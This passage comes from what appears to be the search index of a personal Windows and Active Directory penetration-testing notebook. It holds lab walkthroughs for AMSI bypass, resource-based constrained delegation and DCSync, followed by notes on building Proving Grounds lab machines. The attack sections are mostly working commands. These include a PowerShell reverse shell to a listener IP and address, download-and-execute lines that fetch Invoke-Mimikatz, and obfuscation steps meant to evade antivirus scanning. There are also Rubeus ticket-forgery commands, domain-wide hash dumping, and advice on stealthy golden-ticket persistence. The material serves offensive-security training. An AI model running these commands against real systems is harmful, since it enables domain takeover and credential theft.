Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() \u21d2 We fire up Powershell ISE and load ISESteroids and then obfuscate the code : AMSI doesn't flag it as malicious content after obfuscation and we get a reverse shell : 2) Obfuscating PowerView with Invoke-Obfuscation \u21d2 So AMSI flags powerview as an malicious script so we will try and bypass this by obfuscating using Invoke-Mimikatz Import-Module ./Invoke-Obfuscation.psd1 Out-ObfuscatedTokenCommand -Path PowerView.ps1 | Out-File powerview.ps1 Running the obfuscated powerview : 3) Running Mimikatz by obfuscating an bypass for amsi using amsi.fail : \u21d2 So we will be bypassing AMSI by forcing an error using an payload from https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell Obfuscating it using https://amsi.fail/ \u21d2 Running Invoke-Mimikatz : IEX (New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1\"); Invoke-Mimikatz -Command 'privilege::debug coffee' IEX (New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1\"); Invoke-Mimikatz -Command '\"lsadump::dcsync /all /csv\"'","title":"Powershell AMSI Bypass"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Powershell%20AMSI%20Bypass/#powershell-amsi-bypass","text":"","title":"Powershell AMSI Bypass"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Powershell%20AMSI%20Bypass/#what-is-amsi","text":"Essentially, AMSI is an interface on which applications or services are able to scan a script\u2019s content for malicious usage. If a signature in the script is registered by the AMSI antimalware service provider (Windows Defender by default), it will be blocked. When a PowerShell process is created , AMSI.DLL is loaded from disk into its address space. Within AMSI.DLL , there\u2019s a function known as AmsiScanBuffer(), essentially the function used to scan a script\u2019s content. In the PowerShell command prompt, any supplied content would first be sent to AmsiScanBuffer() , before any execution takes place. Subsequently, AmsiScanBuffer() would check with the registered anti-virus to determine if any signatures have been created. If the content is deemed malicious , it would be blocked .","title":"What is AMSI ?"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Powershell%20AMSI%20Bypass/#obfuscation","text":"\u21d2 So AMSI can be bypassed through obfuscations. You can use the following tools to create obfuscated payloads to bypass AMSI : ISESteroids Invoke-Obfuscation AMSI.FAIL","title":"Obfuscation"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Powershell%20AMSI%20Bypass/#1-obfuscating-nishang-with-isesteroids","text":"\u21d2 So when we try running nishang reverse TCP it gets flagged by AMSI as malicious content : $client = New-Object System.Net.Sockets.TCPClient(\"192.168.136.137\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() \u21d2 We fire up Powershell ISE and load ISESteroids and then obfuscate the code : AMSI doesn't flag it as malicious content after obfuscation and we get a reverse shell :","title":"1) Obfuscating nishang with ISESteroids"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Powershell%20AMSI%20Bypass/#2-obfuscating-powerview-with-invoke-obfuscation","text":"\u21d2 So AMSI flags powerview as an malicious script so we will try and bypass this by obfuscating using Invoke-Mimikatz Import-Module ./Invoke-Obfuscation.psd1 Out-ObfuscatedTokenCommand -Path PowerView.ps1 | Out-File powerview.ps1 Running the obfuscated powerview :","title":"2) Obfuscating PowerView with Invoke-Obfuscation"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Powershell%20AMSI%20Bypass/#3-running-mimikatz-by-obfuscating-an-bypass-for-amsi-using-amsifail","text":"\u21d2 So we will be bypassing AMSI by forcing an error using an payload from https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell Obfuscating it using https://amsi.fail/ \u21d2 Running Invoke-Mimikatz : IEX (New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1\"); Invoke-Mimikatz -Command 'privilege::debug coffee' IEX (New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1\"); Invoke-Mimikatz -Command '\"lsadump::dcsync /all /csv\"'","title":"3) Running Mimikatz by obfuscating an bypass for amsi using amsi.fail :"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Resource%20Based%20Constrained%20Delegation/","text":"Resource Based Constrained Delegation Lab Setup \u21d2 So for us to perform resource based constrained delegation attack a user/machine must have GenericWrite to another machine . So we will be setting GenericWrite on vDC01 for the user Naqi using ADUC [ Active Directory Users and Computer ] : Performing the Attack \u21d2 So for a person to perform this attack he/she must have Write on msDS-AllowedToActOnBehalfOfOtherIdentity attribute to a machine. So first we will create a new computer object ENOX01 in Active Directory using PowerMad Then we leverage WRITE privilege on the vDC01 computer object and update msDS-AllowedToActOnBehalfOfOtherIdentity attribute to contain a security descriptor of ENOX01 machine. In simple terms this means vDC01 will allow the computer resource ENOX01 to impersonate any domain user if they want to access any service on vDC01 We use Rubeus s4u extension to impersonate as Administrator user and request an ticket to cifs service. Then finally we impersonate Administrator user and request LDAP Service ticket to perform DCSync attack using mimikatz . i) Creating Computer Object So first we will be creating computer object named ENOX01 using Powermad and note the SID Import-Module .\\Powermad.ps1 New-MachineAccount -MachineAccount ENOX01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose SID : S-1-5-21-1710056623-765944083-1957563412-1117 ii) Setting msDS-AllowedToActOnBehalfOfOtherIdentity attribute Next we will be getting the Security Descriptor of ENOX01 and set msds-allowedtoactonbehalfofotheridentity attribute for vDC01 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1710056623-765944083-1957563412-1117)\" $SDBytes = New-Object byte[] ($SD.BinaryLength) $SD.GetBinaryForm($SDBytes, 0) Get-DomainComputer vDC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose Lets confirm we have set it using the following powershell command : Get-NetComputer vDC01 | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity iii) Getting Tickets and dumping hashes \u21d2 So first we will get rc4 hash of the ENOX01 machine password using Rubeus : .\\Rubeus.exe hash /password:123456 /user:ENOX01 /domain:endark.local 32ED87BDB5FDC5E9CBA88547376818D4 \u21d2 Now we will impersonate as Administrator user using s4u extension in Rubeus and request ticket to cifs service : .\\Rubeus.exe s4u /user:ENOX01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:Administrator /msdsspn:cifs/vdc01.endark.local /outfile:dc.kirbi /ptt \u21d2 We will now request an ticket to ldap service instead so we can perform dcsync attack using mimikatz and retrieve all the hashes in the domain for persistence : .\\Rubeus.exe s4u /user:ENOX01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:Administrator /msdsspn:ldap/vdc01.endark.local /outfile:ldap.kirbi","title":"Resource Based Constrained Delegation"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Resource%20Based%20Constrained%20Delegation/#resource-based-constrained-delegation","text":"","title":"Resource Based Constrained Delegation"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Resource%20Based%20Constrained%20Delegation/#lab-setup","text":"\u21d2 So for us to perform resource based constrained delegation attack a user/machine must have GenericWrite to another machine . So we will be setting GenericWrite on vDC01 for the user Naqi using ADUC [ Active Directory Users and Computer ] :","title":"Lab Setup"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Resource%20Based%20Constrained%20Delegation/#performing-the-attack","text":"\u21d2 So for a person to perform this attack he/she must have Write on msDS-AllowedToActOnBehalfOfOtherIdentity attribute to a machine. So first we will create a new computer object ENOX01 in Active Directory using PowerMad Then we leverage WRITE privilege on the vDC01 computer object and update msDS-AllowedToActOnBehalfOfOtherIdentity attribute to contain a security descriptor of ENOX01 machine. In simple terms this means vDC01 will allow the computer resource ENOX01 to impersonate any domain user if they want to access any service on vDC01 We use Rubeus s4u extension to impersonate as Administrator user and request an ticket to cifs service. Then finally we impersonate Administrator user and request LDAP Service ticket to perform DCSync attack using mimikatz .","title":"Performing the Attack"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Resource%20Based%20Constrained%20Delegation/#i-creating-computer-object","text":"So first we will be creating computer object named ENOX01 using Powermad and note the SID Import-Module .\\Powermad.ps1 New-MachineAccount -MachineAccount ENOX01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose SID : S-1-5-21-1710056623-765944083-1957563412-1117","title":"i) Creating Computer Object"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Resource%20Based%20Constrained%20Delegation/#ii-setting-msds-allowedtoactonbehalfofotheridentity-attribute","text":"Next we will be getting the Security Descriptor of ENOX01 and set msds-allowedtoactonbehalfofotheridentity attribute for vDC01 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1710056623-765944083-1957563412-1117)\" $SDBytes = New-Object byte[] ($SD.BinaryLength) $SD.GetBinaryForm($SDBytes, 0) Get-DomainComputer vDC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose Lets confirm we have set it using the following powershell command : Get-NetComputer vDC01 | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity","title":"ii) Setting msDS-AllowedToActOnBehalfOfOtherIdentity attribute"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Resource%20Based%20Constrained%20Delegation/#iii-getting-tickets-and-dumping-hashes","text":"\u21d2 So first we will get rc4 hash of the ENOX01 machine password using Rubeus : .\\Rubeus.exe hash /password:123456 /user:ENOX01 /domain:endark.local 32ED87BDB5FDC5E9CBA88547376818D4 \u21d2 Now we will impersonate as Administrator user using s4u extension in Rubeus and request ticket to cifs service : .\\Rubeus.exe s4u /user:ENOX01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:Administrator /msdsspn:cifs/vdc01.endark.local /outfile:dc.kirbi /ptt \u21d2 We will now request an ticket to ldap service instead so we can perform dcsync attack using mimikatz and retrieve all the hashes in the domain for persistence : .\\Rubeus.exe s4u /user:ENOX01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:Administrator /msdsspn:ldap/vdc01.endark.local /outfile:ldap.kirbi","title":"iii) Getting Tickets and dumping hashes"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Using%20DCSync%20attack%20to%20steal%20user%20hashes%20in%20a%20domain/","text":"Using DCSync attack to steal user hashes in a domain Domain: based.local To perform the DCSync attack, you have to have the following permissions over the domain The initial foothold must be against a domain account with domain replication privileges; the Directory Replication Service Remote Protocol (MS-DRSR); MS-DRSR is a legitimate Active Directory service that cannot be disabled. Checking permissions By default these privileges are limited to the: domain administrators , enterprise administrators , administrators , and domain controller groups. However, in certain cases, ordinary domain owners may have the needed permissions to launch a DCSync attack . Those roles have replication permissions that include the following rights that enable a DCSync attack: Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes In Filtered Set (optional) Some apps really need these permissions to replicate users in a domain, reason you might see groups or users with these permissions. Replicating Directory Changes In Filtered Set is an optional Permission You can check this using PowerShell Powershell (Get-Acl \"ad:\\dc=based,dc=local\").Access | ? {$_.IdentityReference -match 'thereplicator' -and ($_.ObjectType -eq \"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\" -or $_.ObjectType -eq \"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\" -or $_.ObjectType -eq \"89e95b76-444d-4c62-991a-0facbeda640c\" ) } Command breakdown (Get-Acl \"ad:\\dc=based,dc=local\").Access - Grab every permission over the based.local domain objects (Get-Acl \"ad:\\dc=based,dc=local\").Access | ? {$_.IdentityReference -match 'thereplicator'} - Grab every permission thereplicator user has over the domain objects (Get-Acl \"ad:\\dc=based,dc=local\").Access | ? {$_.IdentityReference -match 'thereplicator' -and ($_.ObjectType -eq \"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\" -or $_.ObjectType -eq \"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\" -or $_.ObjectType -eq \"89e95b76-444d-4c62-991a-0facbeda640c\" ) } - We've added more checks to previous command to only grab the required permissions for our attack, which are: Replicating Directory Changes In Filtered Se t, Replicating Directory Changes All , Replicating Directory Changes (optional) Performing the attack itself We are going to use mimikatz lsadump::dcsync /all /csv This will dump the entire domain in csv format which will output username, RID and NT hash You could also specify the domain like lsadump::dcsync /all /csv /domain:based.local What to do futher? Well, you could use the Administrator NT Hash but that would not be very stealthy, instead you could use krbtgt's NT Hash to create a golden ticket which is much more stealthier. How does the attack work? The DCSync command in Mimikatz allows an attacker to pretend to be a domain controller and retrieve password hashes from other domain controllers, without executing any code on the target. It does so over the MS-DRSR protocol via the DSGetNCChanges method that replicates updates from a naming context (NC) replica on the server.","title":"Using DCSync attack to steal user hashes in a domain"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Using%20DCSync%20attack%20to%20steal%20user%20hashes%20in%20a%20domain/#using-dcsync-attack-to-steal-user-hashes-in-a-domain","text":"Domain: based.local To perform the DCSync attack, you have to have the following permissions over the domain The initial foothold must be against a domain account with domain replication privileges; the Directory Replication Service Remote Protocol (MS-DRSR); MS-DRSR is a legitimate Active Directory service that cannot be disabled.","title":"Using DCSync attack to steal user hashes in a domain"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Using%20DCSync%20attack%20to%20steal%20user%20hashes%20in%20a%20domain/#checking-permissions","text":"By default these privileges are limited to the: domain administrators , enterprise administrators , administrators , and domain controller groups. However, in certain cases, ordinary domain owners may have the needed permissions to launch a DCSync attack . Those roles have replication permissions that include the following rights that enable a DCSync attack: Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes In Filtered Set (optional) Some apps really need these permissions to replicate users in a domain, reason you might see groups or users with these permissions. Replicating Directory Changes In Filtered Set is an optional Permission You can check this using PowerShell","title":"Checking permissions"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Using%20DCSync%20attack%20to%20steal%20user%20hashes%20in%20a%20domain/#powershell","text":"(Get-Acl \"ad:\\dc=based,dc=local\").Access | ? {$_.IdentityReference -match 'thereplicator' -and ($_.ObjectType -eq \"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\" -or $_.ObjectType -eq \"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\" -or $_.ObjectType -eq \"89e95b76-444d-4c62-991a-0facbeda640c\" ) }","title":"Powershell"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Using%20DCSync%20attack%20to%20steal%20user%20hashes%20in%20a%20domain/#command-breakdown","text":"(Get-Acl \"ad:\\dc=based,dc=local\").Access - Grab every permission over the based.local domain objects (Get-Acl \"ad:\\dc=based,dc=local\").Access | ? {$_.IdentityReference -match 'thereplicator'} - Grab every permission thereplicator user has over the domain objects (Get-Acl \"ad:\\dc=based,dc=local\").Access | ? {$_.IdentityReference -match 'thereplicator' -and ($_.ObjectType -eq \"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\" -or $_.ObjectType -eq \"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\" -or $_.ObjectType -eq \"89e95b76-444d-4c62-991a-0facbeda640c\" ) } - We've added more checks to previous command to only grab the required permissions for our attack, which are: Replicating Directory Changes In Filtered Se t, Replicating Directory Changes All , Replicating Directory Changes (optional)","title":"Command breakdown"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Using%20DCSync%20attack%20to%20steal%20user%20hashes%20in%20a%20domain/#performing-the-attack-itself","text":"We are going to use mimikatz lsadump::dcsync /all /csv This will dump the entire domain in csv format which will output username, RID and NT hash You could also specify the domain like lsadump::dcsync /all /csv /domain:based.local","title":"Performing the attack itself"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Using%20DCSync%20attack%20to%20steal%20user%20hashes%20in%20a%20domain/#what-to-do-futher","text":"Well, you could use the Administrator NT Hash but that would not be very stealthy, instead you could use krbtgt's NT Hash to create a golden ticket which is much more stealthier.","title":"What to do futher?"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Using%20DCSync%20attack%20to%20steal%20user%20hashes%20in%20a%20domain/#how-does-the-attack-work","text":"The DCSync command in Mimikatz allows an attacker to pretend to be a domain controller and retrieve password hashes from other domain controllers, without executing any code on the target. It does so over the MS-DRSR protocol via the DSGetNCChanges method that replicates updates from a naming context (NC) replica on the server.","title":"How does the attack work?"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Creation/Art%20of%20Creating%20Machines/","text":"Art of Creating Machines 1) Getting Started 1.1) Introduction to UGC Program User-Generated Content Program is a program that allows people to make submission to Offensive Security Proving Grounds lab and receive compensation upon acceptance after being reviewed by the Labs Team. As of 11th January 2022, the rewards are as following: You can find more information here : https://www.offensive-security.com/labs/submit/ https://help.offensive-security.com/hc/en-us/articles/360049610511-User-Generated-Content-FAQ 1.2) Researching So before starting to build a machine, you\u2019ll have to first perform a lot of researching to develop an idea for the machine. Following are some examples of what I personally do : Great place to start would be on twitter and look for any interesting research by companies / individuals. You should also bookmark them so you can check regularly if they added anything new. Stay updated on new vulnerabilities through twitter or The Daily Swig by PortSwigger. If you\u2019re planning to build a CVE based machine, browsing through exploit-db.com and cve.mitre.org will be very helpful. Keep an eye on Exploit Database Security Papers for new papers. In the end it all comes down to how creative you can be with vulnerabilities you have discovered and if they go well with each other to make a complete machine. You can reach out to the Labs Team on Offensive Security Discord in #user-generated-content channel to get your ideas reviewed by them before proceeding to make the machine. 1.3) Setting up Environment You can use Vagrant to easily deploy and destroy VM\u2019s on VMware / VirtualBox. Following links will be helpful for the installation and configuring the providers : https://www.vagrantup.com/docs/installation [ Vagrant Installation ] https://www.vagrantup.com/docs/providers/virtualbox [ VirtualBox Provider ] https://www.vagrantup.com/docs/providers/vmware/installation [ Installing VMware provider ] https://vagrantcloud.com/search [ VM Images ] ** 1.3.1) Linux Environment Following is an example on how to deploy a Ubuntu 20.04 VM using vagrant on VMware provider : i) Create a directory with the following structure : box directory here will be used for the Vagrant environment. data directory will be mounted on the machine so we can share files easily. ii) Move into box directory and run the following command to initialize the directory to be a Vagrant environment by creating an initial Vagrantfile : vagrant init bento/ubuntu-20.04 iii) Next step is to edit VagrantFile : Editing VM provider to vmware_desktop and mounting data directory on the machine : iv) For deploying the VM, run the following command from the box directory : vagrant up v) To interact with the box, you can ssh by running the following command from the box directory : vagrant ssh vi) To stop the VM, run the following command : vagrant halt vii) To destroy the VM, run the following command : [ NOTE: Everything will be lost except files in data directory ] vagrant destroy 1.3.2) Windows Environment Following is an example on how to deploy a Windows Server 2019 Standard Desktop VM using vagrant on VMware provider : i) Create a directory with the following structure : box directory here will be used for the Vagrant environment. data directory will be mounted on the machine so we can share files easily. ii) Move into box directory and run the following command to initialize the directory to be a Vagrant environment by creating an initial Vagrantfile : vagrant init gusztavvargadr/windows-server-2019-standard-desktop iii) Next step is to edit VagrantFile : Editing VM provider to vmware_desktop and mounting data directory on the machine : iv) For deploying the VM, run the following command from the box directory : vagrant up v) To interact with the box, you can ssh by running the following command from the box directory : vagrant ssh vi) To stop the VM, run the following command : vagrant halt vii) To destroy the VM, run the following command : [ NOTE: Everything will be lost except files in data directory ] vagrant destroy 2) Building Machines In this section you will find some examples on how to setup / configure certain things for Active Directory and Windows using PowerShell. It will help you get the idea on how things are done. 2.1) Active Directory 2.1.1) Setting up an Active Directory Domain i) After deploying a Windows Server 2019 VM, we\u2019ll change the administrator password and rename the machine using the following powershell commands : # Changing Admin Password net user administrator 'P@$$w0rd!1234' /active:yes # Changing Machine name $SecPassword = ConvertTo-SecureString 'P@$$w0rd!1234' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPassword) Rename-Computer -NewName \"DC01\" -DomainCredential $Cred -Restart Machine will reboot in the end. ii) Next we\u2019ll be configuring DNS , installing active directory domain services and promote the server to a domain controller using the following powershell commands : # Setting DNS Server Addresses Set-DnsClientServerAddress -InterfaceIndex (Get-NetAdapter).InterfaceIndex -ServerAddresses (\"127.0.0.1\",\"8.8.8.8\") # Installing AD Domain Services Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools # Promoting to a domain controller $SecPassword = ConvertTo-SecureString 'P@$$w0rd!1234' -AsPlainText -Force Install-ADDSForest -DomainName \"based.offsec\" -CreateDnsDelegation:$false -DatabasePath \"C:\\Windows\\NTDS\" -SafeModeAdministratorPassword $SecPassword -DomainMode \"7\" -DomainNetbiosName \"BASED\" -ForestMode \"7\" -InstallDns:$true -LogPath \"C:\\Windows\\NTDS\" -SysvolPath \"C:\\Windows\\SYSVOL\" -Force:$true For better understanding of Install-ADDSForest arguments please refer : https://docs.microsoft.com/en-us/powershell/module/addsdeployment/install-addsforest Machine will reboot in the end. 2.1.2) Joining a machine to Active Directory Domain i) After deploying a windows vm of your choice , we\u2019ll change the local administrator password and rename the machine using the following powershell commands : # Changing Admin Password net user administrator 'ClientMachine123!!' /active:yes # Changing Machine name $SecPassword = ConvertTo-SecureString 'ClientMachine123!!' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPassword) Rename-Computer -NewName \"CLIENT01\" -DomainCredential $Cred -Restart Machine will reboot in the end. ii) Next we\u2019ll be configuring the DNS and connecting to the AD Domain : # Setting DNS Write-Host \"[2] Setting DNS and Connecting to Domain\" $DC01= Read-Host \"Enter DC01 IP Address\" Set-DnsClientServerAddress -InterfaceIndex (Get-NetAdapter).InterfaceIndex -ServerAddresses (\"$DC01\",\"8.8.8.8\") # Adding CLIENT01 to based.offsec domain $SecPassword = ConvertTo-SecureString 'P@$$w0rd!1234' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('BASED\\Administrator', $SecPassword) Add-Computer -DomainName based.offsec -Credential $Cred -Restart -Force DC01 should be running. Machine will reboot in the end. 2.1.3) Setting up Child Domain i) After deploying a Windows Server 2019 VM, we\u2019ll change the administrator password and rename the machine using the following powershell commands : # Changing Admin Password net user administrator 'VeryBasedIndeed123!' # Changing Machine name $SecPassword = ConvertTo-SecureString 'VeryBasedIndeed123!' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPassword) Rename-Computer -NewName \"DC02\" -DomainCredential $Cred -Restart Machine will reboot in the end. ii) Next we\u2019ll be configuring DNS , Installing Active Directory domain services and promoting to a domain controller in a child domain ( child.based.offsec ) : # Setting DNS Ip Address as DC01 $DC01= Read-Host \"Enter DC01 IP Address\" Set-DnsClientServerAddress -InterfaceIndex (Get-NetAdapter).InterfaceIndex -ServerAddresses (\"$DC01\",\"8.8.8.8\") # Installing AD Domain Services Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools # Promoting to a domain controller $SecPassword = ConvertTo-SecureString 'P@$$w0rd!1234' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('BASED\\Administrator', $SecPassword) Install-ADDSDomain -Credential $Cred -NewDomainName \"child\" -ParentDomainName \"based.offsec\" -InstallDNS -CreateDNSDelegation -NewDomainNetbiosName \"CHILD\" -DomainMode \"7\" -ReplicationSourceDC \"DC01.based.offsec\" -SafeModeAdministratorPassword $SecPassword -DatabasePath \"C:\\Windows\\NTDS\" -LogPath \"C:\\Windows\\NTDS\" -SysvolPath \"C:\\Windows\\SYSVOL\" -Force:$true For better understanding of Install-ADDSDomain arguments, please refer : https://docs.microsoft.com/en-us/powershell/module/addsdeployment/install-addsdomain DC01 should be running. Machine will reboot in the end. 2.1.4) Configuring Services i) Configuring WinRM using PowerShell : Set-Service WinRM -StartMode Automatic # Verify start mode and state - it should be running Get-WmiObject -Class win32_service | Where-Object {$_.name -like \"WinRM\"} Set-Item WSMan:localhost\\client\\trustedhosts -Value * -Force # Opening WinRM port in firewall netsh advfirewall firewall add rule name=\"WinRM-HTTP\" dir=in localport=5985 protocol=TCP action=allow ii) Configuring RDP using PowerShell : Set-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\' -Name \"fDenyTSConnections\" -Value 0 Set-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\\' -Name \"UserAuthentication\" -Value 0 Enable-NetFirewallRule -DisplayGroup \"Remote Desktop\" iii) Installing ADCS using PowerShell : Add-WindowsFeature Adcs-Cert-Authority -IncludeManagementTools Install-AdcsCertificationAuthority -CAType EnterpriseRootCA -Force:$true 2.1.5) Configuring AD Accounts i) Disabling password complexity : secedit /export /cfg c:\\secpol.cfg (gc C:\\secpol.cfg).replace(\"PasswordComplexity = 1\", \"PasswordComplexity = 0\") | Out-File C:\\secpol.cfg secedit /configure /db c:\\windows\\security\\local.sdb /cfg c:\\secpol.cfg /areas SECURITYPOLICY rm -force c:\\secpol.cfg -confirm:$false gpupdate /force ii) Adding user to an AD domain : $UserPassword = ConvertTo-SecureString 'password123' -AsPlainText -Force New-ADUser -Name \"Enox\" -GivenName \"Enox\" -SamAccountName \"enox\" -AccountPassword $UserPassword -ChangePasswordAtLogon $False -Enabled $True iii) Active Directory Groups : \u21d2 Remote Management Users - users part of this group are able to WinRM to the machine. net localgroup \"Remote Management Users\" /add enox /dom \u21d2 Remote Desktop Users - users part of this group are able to RDP to the machine. [ NOTE: You\u2019ll also have to grant the user SeRemoteInteractiveLogonRight ] # Adding user to Remote Desktop Users group net localgroup \"Remote Desktop Users\" /add enox /dom # Granting SeRemoteInteractiveLogonRight using Carbon $Identity = \"BASED\\enox\" $CarbonDllPath = \"C:\\Data\\Carbon\\bin\\Carbon.dll\" [Reflection.Assembly]::LoadFile($CarbonDllPath) [Carbon.Lsa]::GrantPrivileges( $Identity , \"SeRemoteInteractiveLogonRight\" ) Carbon Download Link : http://get-carbon.org/about_Carbon_Installation.html iv) Configuring ACLs : Granting GenericWrite on a user [ siddicky \u2192 GenericWrite \u2192 enox ] : $ADSI = [ADSI]\"LDAP://CN=Enox,CN=Users,DC=based,DC=offsec\" $IdentityReference = (New-Object System.Security.Principal.NTAccount(\"siddicky\")).Translate([System.Security.Principal.SecurityIdentifier]) $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,\"GenericWrite\",\"Allow\" $ADSI.psbase.ObjectSecurity.SetAccessRule($ACE) $ADSI.psbase.commitchanges() Granting GenericWrite on Domain Controller [ enox \u2192 GenericWrite \u2192 DC01 ] : $ADSI = [ADSI]\"LDAP://CN=DC01,OU=Domain Controllers,DC=based,DC=offsec\" $IdentityReference = (New-Object System.Security.Principal.NTAccount(\"enox\")).Translate([System.Security.Principal.SecurityIdentifier]) $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,\"GenericWrite\",\"Allow\" $ADSI.psbase.ObjectSecurity.SetAccessRule($ACE) $ADSI.psbase.commitchanges() v) Granting a domain user privilege to logon locally on DC : $Identity = \"BASED\\siddicky\" $CarbonDllPath = \"C:\\Data\\Carbon\\bin\\Carbon.dll\" [Reflection.Assembly]::LoadFile($CarbonDllPath) [Carbon.Lsa]::GrantPrivileges( $Identity , \"SeInteractiveLogonRight\" ) 2.2) Windows Please check pinned messages in #user-generated-content channel on Offensive Security discord to get the sample build script for windows. 2.2.1) Setting up an Windows Machine After deploying a Windows VM, we\u2019ll change the administrator password and rename the machine using the following powershell commands : # Changing Admin Password net user administrator 'MakingMachines2022!!' /active:yes # Changing Machine name to BASED $SecPassword = ConvertTo-SecureString 'MakingMachines2022!!' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPassword) Rename-Computer -NewName \"BASED\" -DomainCredential $Cred -Restart Machine will reboot in the end. 2.2.2) Configuring Windows Accounts i) Creating user : # Creating user net user coaran \"VeryBasedMoment!!\" /add ## Configuring User Profile $password = ConvertTo-SecureString 'VeryBasedMoment!!' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('BASED\\coaran', $password) Start-Process PowerShell -Cred $Cred -ArgumentList 'whoami' ii) Granting Privileges using Carbon : You can find list of privileges that can be granted using Carbon here Example granting SeBackupPrivilege : # Giving Privileges $Identity = \"coaran\" $CarbonDllPath = \"C:\\Data\\Carbon\\bin\\Carbon.dll\" [Reflection.Assembly]::LoadFile($CarbonDllPath) [Carbon.Lsa]::GrantPrivileges( $Identity , \"SeBackupPrivilege\" ) 2.2.3) Creating Services using nssm If you have ever wanted to create a service that for example runs a flask application or a powershell script you can use nssm to set it up. Installing nssm on the machine using powershell : # Downloading nssm Invoke-WebRequest -uri 'https://nssm.cc/release/nssm-2.24.zip' -outfile C:\\Windows\\Temp\\nssm.zip # Unzipping the files to C:\\Program Files Expand-Archive -LiteralPath C:\\Windows\\Temp\\nssm.zip -DestinationPath \"C:\\Program Files\" # Granting read and execute perms for everyone cmd /c 'icacls \"C:\\Program Files\\nssm-2.24\" /grant Everyone:rx /T' \u21d2 Example 1 : [ Running a flask application as a service ] # Creating service & \"C:\\Program 